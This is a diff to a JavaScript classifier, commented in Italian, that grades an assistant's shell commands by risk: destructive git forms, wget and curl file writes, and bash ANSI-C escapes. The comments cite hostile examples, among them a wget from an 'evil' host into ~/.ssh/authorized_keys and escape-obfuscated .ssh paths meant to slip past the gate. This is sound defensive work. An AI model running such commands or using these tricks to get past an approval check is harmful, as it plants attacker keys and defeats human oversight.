-  // `git restore`. I nomi di ramo comuni (`main`, `origin/main`, `v1.0`,
-  // `feature/login`) NON combaciano e restano alla conferma leggera.
+  // L'operando prende di mira FILE invece di un ramo? `git checkout <percorso>` SCARTA le
+  // modifiche non salvate. I nomi di ramo comuni non combaciano e restano a conferma leggera.
   function looksLikePathspec(arg) {
     for (const v of argVariants(arg)) {
       const bare = v.replace(/[\\/]+$/, ''); // `./` → `.`, `src/` → `src`
@@ -573,55 +400,32 @@
     return false;
   }
 
-  // Sotto-comandi il cui LIVELLO dipende dagli argomenti. Due famiglie:
-  //  • "duali" lettura/scrittura: ELENCANO (livello 1) se nudi o con soli flag,
-  //    CREANO/IMPOSTANO (livello 2) con un operando. `git tag` elenca / `git tag
-  //    v1.0` crea; `git branch` elenca / `git branch nuovo` crea; `git config
-  //    --list` legge / `git config user.name "X"` scrive; `git remote -v` elenca
-  //    / `git remote add` aggiunge.
-  //  • "sicuro vs distruttivo": `checkout` e `stash` hanno forme innocue
-  //    (cambio/creazione ramo, salvataggio di uno stash → livello 2) e forme che
-  //    SCARTANO LAVORO NON SALVATO in modo irreversibile (livello 3, digita
-  //    "conferma"), come i loro gemelli `restore`/`reset --hard`/`clean`.
-  // Le forme distruttive a flag (branch -D, tag -d, config --unset, remote
-  // remove/prune, checkout -f/--discard-changes) sono già intercettate prima da
-  // GIT_DANGER_RE; il resto lo discrimina il predicato qui.
+  // Sotto-comandi il cui livello dipende dagli argomenti: i duali ELENCANO (1) da nudi e
+  // CREANO (2) con un operando; `checkout` e `stash` hanno anche forme distruttive (3).
   const GIT_DUAL = {
     tag: (cmd) => (hasOperand(gitArgsAfterSub(cmd)) ? 2 : 1),
     branch: (cmd) => (hasOperand(gitArgsAfterSub(cmd)) ? 2 : 1),
-    // `git checkout` è DISTRUTTIVO quando prende di mira un pathspec: `git
-    // checkout .` (scarta TUTTE le modifiche), `git checkout -- <path>`, `git
-    // checkout <ref> -- <path>`, `git checkout <ref> <path>` (ripristina il file
-    // dal ref, buttando via le modifiche locali) → livello 3. Resta livello 2 il
-    // checkout NON distruttivo: cambio ramo (`git checkout main`), creazione
-    // (`git checkout -b nuovo [start]`, `-B`), torna-al-precedente (`git checkout
-    // -`). La discriminante è la presenza di un pathspec; `-b`/`-B` (e le sue
-    // varianti) sono creazione di ramo, MAI scarto di path, anche con 2 operandi.
+    // `git checkout` è distruttivo quando prende di mira un pathspec: ripristina i file dal ref
+    // buttando via le modifiche locali → 3. Cambio o creazione di ramo restano 2.
     checkout: (cmd) => {
       const args = gitArgsAfterSub(cmd);
-      // `--` separa esplicitamente i pathspec: tutto ciò che segue è un file da
-      // ripristinare (scarto del working tree).
+      // `--` separa esplicitamente i pathspec: tutto ciò che segue è un file da ripristinare.
       if (args.includes('--')) return 3;
-      // Flag che dichiarano "sto lavorando sui FILE" anche senza scrivere il
-      // percorso nel comando: `--pathspec-from-file=<file>` legge l'elenco dei
-      // file da un altro file (verificato: scarta davvero le modifiche non
-      // salvate), `-p`/`--patch` scarta pezzo per pezzo, `--ours`/`--theirs`
-      // sceglie una versione del file in conflitto.
+      // Flag che dichiarano «sto lavorando sui FILE» anche senza scrivere il percorso:
+      // `--pathspec-from-file`, `-p`/`--patch`, `--ours`/`--theirs` scartano comunque modifiche.
       if (args.some((a) => /^(--pathspec-from-file(=|$)|--pathspec-file-nul$|-p$|--patch$|--ours$|--theirs$)/.test(a))) return 3;
-      // `-b`/`-B`/`--orphan`/`--detach`: crea/sposta un ramo, non tocca i path.
+      // `-b`/`-B`/`--orphan`/`--detach` creano o spostano un ramo, non toccano i path.
       if (args.some((a) => /^(-b|-B|--orphan|--detach)$/.test(a))) return 2;
       const ops = args.filter((a) => !a.startsWith('-'));
       if (ops.some(looksLikePathspec)) return 3; // scarta le modifiche dei file
       if (ops.length >= 2) return 3;             // `<ref> <path>` senza `--`
       return 2;                                  // cambio ramo (0-1 operando)
     },
-    // `git stash` SALVA le modifiche (recuperabile con pop → livello 2), ma
-    // `git stash drop`/`clear` ELIMINANO stash salvati in modo irreversibile →
-    // livello 3. Gli altri sotto-verbi (push/save/pop/apply/list/show) restano 2.
+    // `git stash` salva ed è recuperabile con pop → 2; `drop` e `clear` eliminano stash
+    // salvati in modo irreversibile → 3.
     stash: (cmd) => {
       const raw = gitArgsAfterSub(cmd).filter((a) => !a.startsWith('-'))[0] || '';
-      // Anche qui vale la lettura "come la farebbe la shell": `git stash d\rop`
-      // elimina lo stash tanto quanto `git stash drop`.
+      // Anche qui la lettura «come la farebbe la shell»: `git stash d\rop` elimina lo stash.
       const verbs = argVariants(raw).map((v) => v.toLowerCase());
       return verbs.some((v) => v === 'drop' || v === 'clear') ? 3 : 2;
     },
@@ -672,10 +476,8 @@
   function classifyNpm(cmd) {
     const sub = subcommandOf(cmd);
     if (!sub) return 1; // `npm` da solo → help
-    // `config`: leggere la configurazione è lettura (get/list/ls/debug/nudo),
-    // ma `set`/`delete`/`rm`/`unset`/`edit`/`add` la CAMBIANO — e tra le chiavi
-    // c'è il REGISTRY, cioè da dove npm/pip scaricano ed eseguono codice.
-    // Reindirizzarlo non è lettura → conferma (2). `edit` apre pure un editor.
+    // `config`: leggere è lettura, ma set/delete/edit cambiano anche il REGISTRY, cioè da dove
+    // npm e pip scaricano ed eseguono codice. Reindirizzarlo non è lettura → 2.
     if (sub === 'config') {
       const rest = tokens(cmd).slice(1).map(unquote).filter((t) => !t.startsWith('-'));
       const verb = (rest[1] || '').toLowerCase(); // rest[0] === 'config'
@@ -690,18 +492,14 @@
     return 3; // run/exec/start/test/publish/sconosciuti → 3
   }
 
-  // Se il comando è una pura sequenza di comandi separati da `&&`, `||` o `;`
-  // (senza pipe, background, redirezioni o sostituzioni), ritorna l'elenco dei
-  // singoli comandi; altrimenti null. Le sequenze "sicure" si classificano poi
-  // pezzo per pezzo prendendo il massimo: concatenare due letture (cd && ls)
-  // non deve trasformarle in un'azione irreversibile.
+  // Sequenza pura (`&&`/`||`/`;`) senza pipe, background, redirezioni o sostituzioni → i
+  // singoli comandi: si prende il massimo, concatenare due letture non le rende un'azione.
   function splitSafeSequence(cmd) {
-    // Metacaratteri che NON sono semplice sequenziamento: redirezioni,
-    // sostituzioni, backtick, newline → non è una sequenza sicura.
+    // Metacaratteri che non sono sequenziamento: redirezioni, sostituzioni, backtick, newline.
     if (/[`<>]|\$\(|\$\{|\r|\n/.test(cmd)) return null;
     const parts = cmd.split(/\s*(?:&&|\|\||;)\s*/).filter(Boolean);
-    // Dopo aver tolto `&&`/`||`/`;`, un `&` o `|` "solitario" residuo significa
-    // background o pipe → non è una sequenza sicura.
+    // Un `&` o `|` solitario rimasto dopo aver tolto `&&`/`||`/`;` è background o pipe:
+    // non è una sequenza sicura.
     for (const p of parts) {
       if (/[&|]/.test(p)) return null;
     }
@@ -710,67 +508,39 @@
 
   // Livello di un SINGOLO comando (senza metacaratteri di sequenza).
   function classifyOne(raw) {
-    // Valuta sempre la forma senza virgolette: `git push "--force"`,
-    // `curl "-o" ~/.ssh/authorized_keys`, `git checkout .""` fanno esattamente
-    // ciò che farebbero senza, e devono ricevere lo stesso livello (vedi
-    // unquote). Le virgolette non possono nascondere neppure i metacaratteri:
-    // quelli sono già stati intercettati prima, sul testo grezzo.
+    // Si valuta sempre la forma senza virgolette: `git push "--force"` fa ciò che farebbe senza
+    // e deve avere lo stesso livello. I metacaratteri erano già intercettati sul testo grezzo.
     const trimmed = dequote(raw);
     const prog = programOf(trimmed);
     if (!prog) return 3;
     if (ALWAYS_3.has(prog)) return 3; // backstop: vale anche col percorso (`/bin/rm`)
 
-    // Superato il backstop dei distruttivi, la whitelist FIDA di un nome solo se
-    // è invocato nudo. Un file su disco che si chiama come un comando fidato
-    // (`.\Get-ChildItem.exe`, `C:\tmp\ls.exe`, `git.exe` dal PATH) NON è quel
-    // comando: è un eseguibile arbitrario → livello 3 di default.
+    // Superato il backstop, la whitelist si fida solo di un nome invocato nudo: un file su
+    // disco che si chiama come un comando fidato è un eseguibile arbitrario → 3.
     if (!isBareName(tokens(trimmed)[0])) return 3;
 
     if (prog === 'git') return classifyGit(trimmed);
     if (prog === 'npm' || prog === 'pip' || prog === 'pip3') return classifyNpm(trimmed);
 
-    // Interpreti / build tool: codice arbitrario → 3, ma la sola interrogazione
-    // di versione/help è lettura → 1 (es. `node --version`, `go version`).
+    // Codice arbitrario → 3, salvo la sola interrogazione di versione o aiuto → 1.
     if (ARBITRARY_CODE.has(prog)) return isVersionQuery(trimmed) ? 1 : 3;
 
     if (LEVEL1.has(prog)) {
-      // Quasi tutti i LEVEL1 restano 1 anche con flag (la lettura non diventa
-      // distruttiva). Eccezione: i pochi comandi che con certi argomenti
-      // IMPOSTANO lo stato (date -s, hostname <nome>) salgono a 2 (conferma).
+      // Quasi tutti i LEVEL1 restano 1 anche con flag; fanno eccezione i pochi che con certi
+      // argomenti IMPOSTANO lo stato.
       const mutates = LEVEL1_MUTATES[prog];
       return mutates && mutates(trimmed) ? 2 : 1;
     }
     // Anche un comando LEVEL2 ridotto a `--version`/`--help` è sola lettura → 1.
     if (LEVEL2.has(prog)) {
       if (isVersionQuery(trimmed)) return 1;
-      // wget SCARICA SEMPRE SU FILE — è questa la differenza con curl, che senza
-      // `-o` stampa a schermo. Senza alcun flag di output `wget <url>` crea
-      // comunque un file nella cartella di lavoro, col nome deciso dall'URL
-      // (quindi dal server); e la cartella di lavoro la sceglie l'assistente da
-      // sé, perché `cd` è livello 1 (nessuna conferma) e la cwd è persistente tra
-      // i suoi comandi. Così `cd ~/.ssh && wget http://evil/authorized_keys` fa
-      // atterrare il file ESATTAMENTE dove lo faceva atterrare
-      // `wget -O ~/.ssh/authorized_keys`, che chiede di digitare "conferma".
-      // Stesso effetto → stesso livello, e NESSUNA eccezione: qualunque esenzione
-      // (perfino `--spider`, l'unica forma che non scarica) si deciderebbe
-      // leggendo il testo del comando, e chi lo compone può sempre far comparire
-      // la parola dove wget non la applica — dopo `--`, dentro le virgolette,
-      // dentro l'URL. Vedi il cappello del file.
+      // wget SCARICA SEMPRE SU FILE: anche senza flag crea un file nella cwd, che l'assistente
+      // sposta da sé con `cd`. Nessuna eccezione, `--spider` compreso: si deciderebbe dal testo.
       if (prog === 'wget') return 3;
-      // curl che scrive un file di output a un percorso arbitrario può
-      // sovrascrivere qualsiasi file (chiavi SSH, script d'avvio) → 3.
       if (prog === 'curl' && CURL_OUTPUT_RE.test(trimmed)) return 3;
-      // curl -D/--dump-header: scrive gli header (contenuto del server) in un
-      // percorso arbitrario → 3.
       if (prog === 'curl' && CURL_DUMP_RE.test(trimmed)) return 3;
-      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr,
-      // --libcurl, --hsts, --alt-svc, --metalink: fanno atterrare su un percorso
-      // scelto dati influenzati dal server → 3.
       if (prog === 'curl' && CURL_ACCESSORY_WRITE_RE.test(trimmed)) return 3;
-      // curl -w '%output{FILE}': il "formato di stampa" atterra su un file → 3.
       if (prog === 'curl' && CURL_WRITE_OUT_FILE_RE.test(trimmed)) return 3;
-      // curl -K/--config: le opzioni (output compreso) arrivano da un file, quindi
-      // l'effetto non si legge nel comando → 3.
       if (prog === 'curl' && CURL_CONFIG_RE.test(trimmed)) return 3;
       if (prog === 'curl' && curlCambiaIlServer(trimmed)) return 3;
       // robocopy /MIR /PURGE (cancellano la destinazione) / /MOVE /MOV
@@ -779,12 +549,8 @@
       return DANGEROUS_FLAG_RE.test(trimmed) ? 3 : 2;
     }
 
-    // Cmdlet PowerShell di sola lettura (`Get-ChildItem`, `Select-String`…): 1
-    // solo se supera anche i controlli strutturali (niente sottoespressioni,
-    // niente scriptblock che invoca). Where-Object/ForEach-Object NON passano di
-    // qui: da soli non filtrano niente, valgono solo dentro una pipeline.
-    // Passiamo `raw` (con le virgolette): segmentIsRead deve poter riconoscere i
-    // letterali quotati come inerti.
+    // Cmdlet PowerShell di lettura: 1 solo se superano anche i controlli strutturali.
+    // Si passa `raw`, con le virgolette: i letterali quotati vanno riconosciuti inerti.
     if (PS_READ.has(prog) && segmentIsRead(raw, false)) return 1;
 
     return 3; // comando non riconosciuto → livello 3 di default
@@ -876,40 +642,129 @@
     return out;
   }
 
+  // sh e bash (anche su Windows) tolgono i backslash e decodificano `$'…'`; PowerShell e cmd no.
+  // Fuori da Windows una shell non indicata è POSIX: lì non ce ne sono altre. Senza contesto il sistema non si sa.
+  function shellPosix(c) {
+    if (c.sistemaIgnoto) return false;
+    return c.win ? c.shell === 'sh' || c.shell === 'bash' : c.shell !== 'powershell' && c.shell !== 'cmd';
+  }
+
+  // /bin/sh su Debian e Ubuntu è dash, che non conosce `$'…'`: lì `\'` chiude la stringa e il resto diventa
+  // altri argomenti. Dove sh può essere dash si misurano tutte e due le letture (#1511).
+  function forseDash(c) {
+    return shellPosix(c) && !c.win && c.shell !== 'bash';
+  }
+  // Senza un `\'` le due letture hanno gli stessi confini, e quella di dash è un nome con `$` e backslash letterali.
+  const APICE_CHE_DASH_CHIUDE = /\$'(?:[^'\\]|\\[^'])*\\'/;
+
+  const ESCAPE_ANSI = { a: 7, b: 8, e: 27, E: 27, f: 12, n: 10, r: 13, t: 9, v: 11, '\\': 92, '\'': 39, '"': 34, '?': 63 };
+  const UTF8 = typeof TextDecoder !== 'undefined' ? new TextDecoder('utf-8', { fatal: true }) : null;
+
+  function byteUtf8(cp, b) {
+    if (cp < 0x80) b.push(cp);
+    else if (cp < 0x800) b.push(0xc0 | (cp >> 6), 0x80 | (cp & 63));
+    else if (cp < 0x10000) b.push(0xe0 | (cp >> 12), 0x80 | ((cp >> 6) & 63), 0x80 | (cp & 63));
+    else b.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 63), 0x80 | ((cp >> 6) & 63), 0x80 | (cp & 63));
+  }
+
+  // Il contenuto di `$'…'` come lo produce bash (da `i`, dopo l'apice). `ignoto`: un escape che non si
+  // riconosce, un NUL o byte che non sono UTF-8; lì le shell non concordano e il percorso non si sa.
+  function ansiC(s, i) {
+    const b = [];
+    let ignoto = false;
+    const hex = (k, max) => { let n = 0; while (n < max && /[0-9A-Fa-f]/.test(s[k + n] || '')) n += 1; return n; };
+    for (; i < s.length; i++) {
+      const ch = s[i];
+      if (ch === '\'') break;
+      if (ch !== '\\') { const cp = s.codePointAt(i); byteUtf8(cp, b); if (cp > 0xffff) i += 1; continue; }
+      const e = s[i + 1];
+      if (e === undefined) { ignoto = true; break; }
+      i += 1;
+      if (Object.prototype.hasOwnProperty.call(ESCAPE_ANSI, e)) { b.push(ESCAPE_ANSI[e]); continue; }
+      if (/[0-7]/.test(e)) {
+        let v = Number(e);
+        for (let n = 0; n < 2 && /[0-7]/.test(s[i + 1] || ''); n++) { i += 1; v = v * 8 + Number(s[i]); }
+        b.push(v & 0xff);
+        continue;
+      }
+      if (e === 'x' || e === 'u' || e === 'U') {
+        const n = hex(i + 1, e === 'x' ? 2 : e === 'u' ? 4 : 8);
+        if (!n) { ignoto = true; continue; }
+        const v = parseInt(s.slice(i + 1, i + 1 + n), 16);
+        i += n;
+        if (e === 'x') b.push(v);
+        else if (v > 0x10ffff) ignoto = true;
+        else byteUtf8(v, b);
+        continue;
+      }
+      if (e === 'c') {
+        const x = s[i + 1];
+        // Come bash: `\c\` è 0x1c e quel che segue resta com'è (`\c\/` tiene la barra); `\c\\` è uno solo, `\c\'` tiene l'apice.
+        if (x === '\\') {
+          b.push(0x1c);
+          i += 1;
+          if (s[i + 1] === '\\') i += 1;
+          else if (s[i + 1] === '\'') { b.push(39); i += 1; }
+          continue;
+        }
+        if (x === undefined || x === '\'' || !/[\x20-\x7e]/.test(x)) { ignoto = true; continue; }
+        i += 1;
+        b.push(x === '?' ? 0x7f : x.toUpperCase().charCodeAt(0) & 0x1f);
+        continue;
+      }
+      ignoto = true;
+    }
+    if (i >= s.length) ignoto = true;
+    let testo = '';
+    if (b.includes(0) || !UTF8) ignoto = true;
+    else { try { testo = UTF8.decode(new Uint8Array(b)); } catch (_) { ignoto = true; } }
+    return { testo, fine: i, ignoto };
+  }
+
   // Argomenti come li vede la shell: le virgolette raggruppano (un percorso con
   // spazi è UNO) e `variabile` segna un'espansione che può portare un segreto:
   // fuori da `echo` finisce comunque stampata nei messaggi d'errore.
   // Su Windows `\` prima di uno spazio è la fine di un percorso (`src\ \\host\x` sono due operandi), non un escape.
-  function argomenti(raw, win) {
+  function argomenti(raw, c) {
+    const win = c.win;
+    const posix = shellPosix(c);
     const out = [];
     const s = String(raw);
     let cur = '';
     let espande = ''; // il testo fuori dagli apici singoli, dove `$` si espande
     let q = '';
     let aperto = false;
+    let ignoto = false;
     const chiudi = () => {
       if (cur || aperto) {
         // `%NOME%` si espande in cmd anche fra virgolette; `+%H:%M` è il formato di `date`.
         const nomi = nomiVariabili(espande, { percento: false })
           .concat(cur.startsWith('+') ? [] : nomiVariabili(cur, { dollaro: false }));
-        out.push({ testo: cur, variabile: nomi.some((n) => !VAR_INNOCUE.has(n)) });
+        out.push({ testo: cur, variabile: nomi.some((n) => !VAR_INNOCUE.has(n)), ignoto });
       }
-      cur = ''; espande = ''; aperto = false;
+      cur = ''; espande = ''; aperto = false; ignoto = false;
     };
     for (let i = 0; i < s.length; i++) {
       const ch = s[i];
       if (q) {
         if (ch === q) { q = ''; continue; }
+        if (posix && q === '"' && ch === '\\' && /[$`"\\]/.test(s[i + 1] || '')) { cur += s[i + 1]; espande += ch + s[i + 1]; i += 1; continue; }
         cur += ch;
         if (q === '"') espande += ch;
         continue;
       }
-      // `$'…'` (ANSI-C) e `$"…"` (traduzione locale) di bash: il `$` è prefisso
-      // di quoting, non testo. Toltolo, la stringa torna com'è, e le sequenze di
-      // escape restano col loro backslash — che `pezzi()` tratta da separatore,
-      // così `.ss\x68/config` fa comunque affiorare il pezzo `.ss` riservato.
+      // Il classificatore misura il percorso che vedrà la shell: `$'\x2essh'` è `.ssh`, `.\ssh` pure (#1511).
+      if (posix && !c.senzaAnsi && ch === '$' && s[i + 1] === '\'') {
+        const r = ansiC(s, i + 2);
+        cur += r.testo;
+        if (r.ignoto) ignoto = true;
+        aperto = true;
+        i = r.fine;
+        continue;
+      }
       if (ch === '$' && (s[i + 1] === '\'' || s[i + 1] === '"')) { aperto = true; continue; }
       if (ch === '"' || ch === '\'') { q = ch; aperto = true; espande += ' '; continue; }
+      if (posix && ch === '\\' && i + 1 < s.length) { cur += s[i + 1]; espande += ch + s[i + 1]; i += 1; continue; }
       if (!win && ch === '\\' && /\s/.test(s[i + 1] || '')) { cur += s[i + 1]; i += 1; continue; }
       if (/\s/.test(ch)) { chiudi(); continue; }
       cur += ch;
@@ -1000,7 +855,7 @@
     const x = ctx && typeof ctx === 'object' ? ctx : SENZA_CONTESTO;
     const reti = Array.isArray(x.reti) ? x.reti.map((u) => String(u).slice(0, 1).toLowerCase() + ':') : [];
     const shell = String(x.shell || '').toLowerCase();
-    const c = { win: !!x.win, maiuscole: !!x.maiuscole, home: null, cwd: null, reti: new Set(reti), shell };
+    const c = { win: !!x.win, maiuscole: !!x.maiuscole, home: null, cwd: null, reti: new Set(reti), shell, sistemaIgnoto: x === SENZA_CONTESTO };
     const h = dove(String(x.home || ''), c);
     if (h && typeof h === 'object') c.home = h;
     const cw = String(x.cwd || '');
@@ -1162,10 +1017,13 @@
   }
 
   // git: `--no-index` confronta file qualsiasi, `rev:percorso` e ciò che segue `--` sono file.
-  function gitPerimetro(trimmed, c) {
-    const sub = subcommandOf(trimmed);
+  function gitPerimetro(raw, c) {
+    const sub = subcommandOf(dequote(raw));
     if (sub === 'grep') return due(MOTIVI.ricorsivo);
-    const args = gitArgsAfterSub(trimmed);
+    // I percorsi come li legge la shell, come per gli altri lettori.
+    const testi = argomenti(raw, c).slice(1).map((a) => a.testo).filter(Boolean);
+    const k = testi.findIndex((x) => !x.startsWith('-'));
+    const args = k < 0 ? [] : testi.slice(k + 1);
     const libero = args.includes('--no-index');
     const sep = args.indexOf('--');
     // In una cwd di rete ogni nome dato a git va al remoto: come file della cartella
@@ -1281,7 +1139,7 @@
   // Livello di un comando già riconosciuto come lettura (livello 1 di base).
   function perimetroDi(raw, c) {
     const prog = programOf(dequote(raw));
-    const args = argomenti(raw, c.win).slice(1);
+    const args = argomenti(raw, c).slice(1);
     const testi = args.map((a) => a.testo);
     let cerca = null;
     if (prog === 'grep') cerca = operandiGrep(testi);
@@ -1293,8 +1151,9 @@
     if (calcolaRete(prog, testi, c)) return due(MOTIVI.rete);
     if (c.cwd && c.cwd.rete && cercaNomeInRete(prog, testi, c)) return due(MOTIVI.rete);
     if (args.some((a) => a.variabile) || prog === 'printenv') return due(MOTIVI.variabili);
+    if (!stampaSoltanto && args.some((a) => a.ignoto)) return due(MOTIVI.ignoto);
     if (PROCESSI.has(prog)) return due(MOTIVI.processi);
-    if (prog === 'git') return gitPerimetro(dequote(raw), c);
+    if (prog === 'git') return gitPerimetro(raw, c);
     if (LETTORI.has(prog)) return primoFuori(operandiLettore(prog, testi), c);
     if (cerca) {
       if (cerca.ricorsivo) return due(MOTIVI.ricorsivo);
@@ -1335,8 +1194,8 @@
   // Dopo un `cd` la cartella è quella nuova, o la vecchia se il `cd` fallisce.
   function spostati(raw, c) {
     const prog = programOf(dequote(raw));
-    const args = argomenti(raw, c.win).slice(1);
-    if (prog === 'popd' || args.some((a) => a.variabile)) return { ...c, cwd: null };
+    const args = argomenti(raw, c).slice(1);
+    if (prog === 'popd' || args.some((a) => a.variabile || a.ignoto)) return { ...c, cwd: null };
     let dest = null;
     for (let i = 0; i < args.length; i++) {
       const t = args[i].testo;
@@ -1639,17 +1498,17 @@
     if (typeof cmd !== 'string') return TRE;
     const c = { ...contesto(ctx), stampaLibera: true };
     const letture = comeLaShell(cmd, c);
-    return letture == null ? TRE : letture.map((l) => classifica(l, c, 0)).reduce(peggiore);
+    if (letture == null) return TRE;
+    const contesti = forseDash(c) && APICE_CHE_DASH_CHIUDE.test(cmd) ? [c, { ...c, senzaAnsi: true }] : [c];
+    return letture.flatMap((l) => contesti.map((cc) => classifica(l, cc, 0))).reduce(peggiore);
   }
 
   // Un comando senza gruppi: sequenze, pipeline e comandi singoli.
   function classificaPiatta(trimmed, c) {
     if (!trimmed) return TRE;
 
-    // Sequenza pura di comandi (`&&`/`||`/`;`) → livello = massimo dei pezzi.
-    // Vale anche con UN SOLO pezzo: `git checkout .;` (separatore in coda, forma
-    // che la shell esegue identica a `git checkout .`) deve essere classificato
-    // sul comando vero, non sul token `.;` che non somiglia a nulla di noto.
+    // Sequenza pura → livello massimo dei pezzi. Vale anche con UN solo pezzo: `git checkout .;`
+    // va classificato sul comando vero, non sul token `.;` che non somiglia a niente di noto.
     const seq = splitSafeSequence(trimmed);
     if (seq && seq.length) {
       let cands = [c];
@@ -1664,11 +1523,8 @@
       }
       return det;
     }
-    // Pipeline di sole letture (`Get-ChildItem | Sort-Object | Select-Object
-    // -First 5`, `cat file | grep errore`) → livello 1: incanalare una lettura
-    // dentro un'altra lettura non produce niente che la prima non facesse già.
-    // Basta UN segmento non riconosciuto — o uno scriptblock che potrebbe
-    // invocare qualcosa — e si torna al 3 di prima.
+    // Pipeline di sole letture → 1: incanalare una lettura in un'altra non produce niente in
+    // più. Basta un segmento non riconosciuto, o uno scriptblock che invochi, e si torna a 3.
     const pipe = splitSafePipeline(trimmed);
     if (pipe) {
       if (!pipe.every((p) => segmentIsRead(p, true))) return TRE;
@@ -1685,7 +1541,7 @@
         if (i > 0 && (PERCORSO_DAL_TUBO.has(progs[i]) || CERCANO_NOME.has(progs[i])) && cp.cwd && cp.cwd.rete) det = peggiore(det, due(MOTIVI.rete));
         // Join-Path/Split-Path sul valore del tubo compongono ciò che nessun argomento scrive (`'\\' | Join-Path`):
         // chi lo riceve come percorso chiede (noto), e Join-Path -Resolve lo apre da sé.
-        if (i > 0 && progs[i] === 'join-path' && argomenti(p, c.win).some((a) => parametro(a.testo, 'resolve', 1))) det = peggiore(det, due(MOTIVI.ignoto));
+        if (i > 0 && progs[i] === 'join-path' && argomenti(p, c).some((a) => parametro(a.testo, 'resolve', 1))) det = peggiore(det, due(MOTIVI.ignoto));
         if (!FONTI_NOTE.has(progs[i]) || (i > 0 && CALCOLANO.has(progs[i])) || (c.valoriIgnoti && p.includes(SEGNAPOSTO))) noto = false;
         if (ELENCA_OGGETTI.has(progs[i]) || p.includes(SEGNAPOSTO)) elenco = true;
         if (!PS_PIPE_ONLY.has(progs[i])) det = peggiore(det, perimetroDi(p, i < pipe.length - 1 ? { ...cp, stampaLibera: false } : cp));
@@ -1704,11 +1560,21 @@
     return classifyDetail(cmd, ctx).level;
   }
 
+  // Un percorso scritto da un modello, senza i segni di citazione in testa e in coda, anche spaiati: la stessa pulizia
+  // per chi misura il perimetro e per chi tocca il disco, o uno dei due vede un altro percorso (#1499).
+  function pulisciPercorso(percorso) {
+    return String(percorso == null ? '' : percorso).trim().replace(/^["'«“‘‹]+|["'»”’›]+$/g, '').trim();
+  }
+
   // Un percorso singolo (LEGGI_DOCUMENTO): '' se sta nel perimetro, altrimenti il motivo.
   function fuoriPerimetro(percorso, ctx) {
-    let p = String(percorso == null ? '' : percorso).trim();
-    if (/^(["']).*\1$/.test(p)) p = p.slice(1, -1).trim();
-    return fuoriDa(p, contesto(ctx));
+    return fuoriDa(pulisciPercorso(percorso), contesto(ctx));
+  }
+
+  // Il percorso fa contattare a Windows (o al Mac, con /net) un altro computer della rete.
+  function diRete(percorso, ctx) {
+    const p = pulisciPercorso(percorso);
+    return !!p && dove(p, contesto(ctx)) === MOTIVI.rete;
   }
 
   // Nella cartella personale ma privato per la lettura (nascosto, cartella di profilo come la Libreria del Mac): chi
@@ -1725,5 +1591,7 @@
     return (PROFILO_APERTE[nomeNorm(r.segs[r.segs.length - 1])] || []).slice();
   }
 
-  global.SN_CMD_CLASSIFY = { classify, classifyDetail, fuoriPerimetro, privato, aperteDentro, programOf, subcommandOf, comeCmd };
+  global.SN_CMD_CLASSIFY = {
+    classify, classifyDetail, fuoriPerimetro, pulisciPercorso, diRete, privato, aperteDentro, programOf, subcommandOf, comeCmd,
+  };
 })(typeof globalThis !== 'undefined' ? globalThis : self);
